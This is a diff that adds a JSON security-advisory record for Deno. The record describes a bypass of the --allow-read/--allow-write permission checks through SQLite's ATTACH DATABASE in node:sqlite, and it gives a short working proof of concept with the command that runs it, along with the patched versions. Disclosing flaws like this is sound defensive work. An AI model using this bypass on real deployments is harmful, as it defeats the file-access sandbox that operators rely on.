@@ -1,0 +1,39 @@
+[
+  {
+    "advisory": {
+      "id": "RUSTSEC-2025-0138",
+      "package": "deno",
+      "title": "--allow-read / --allow-write permission bypass in `node:sqlite`",
+      "description": "It is possible to bypass Deno's read/write permission\nchecks by using ATTACH DATABASE statement.\n\n## PoC\n\n```\n// poc.js\nimport { DatabaseSync } from \"node:sqlite\"\n\nconst db = new DatabaseSync(\":memory:\");\ndb.exec(\"ATTACH DATABASE 'test.db' as test;\");\n\ndb.exec(\"CREATE TABLE test.test (id INTEGER PRIMARY KEY, name TEXT);\");\n```\n\n```\n$ deno poc.js\n```",
+      "date": "2025-06-03",
+      "aliases": [
+        "CVE-2025-48935",
+        "GHSA-8vxj-4cph-c596"
+      ],
+      "related": [],
+      "collection": "crates",
+      "categories": [],
+      "keywords": [
+        "read/write bypass"
+      ],
+      "cvss": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+      "informational": null,
+      "references": [
+        "https://github.com/denoland/deno/commit/31a97803995bd94629528ba841b2418d3ca01860"
+      ],
+      "source": null,
+      "url": "https://github.com/denoland/deno/security/advisories/GHSA-8vxj-4cph-c596",
+      "withdrawn": null,
+      "license": "CC-BY-4.0"
+    },
+    "affected": null,
+    "versions": {
+      "patched": [
+        ">=2.2.5"
+      ],
+      "unaffected": [
+        "<2.2.0"
+      ]
+    }
+  }
+]
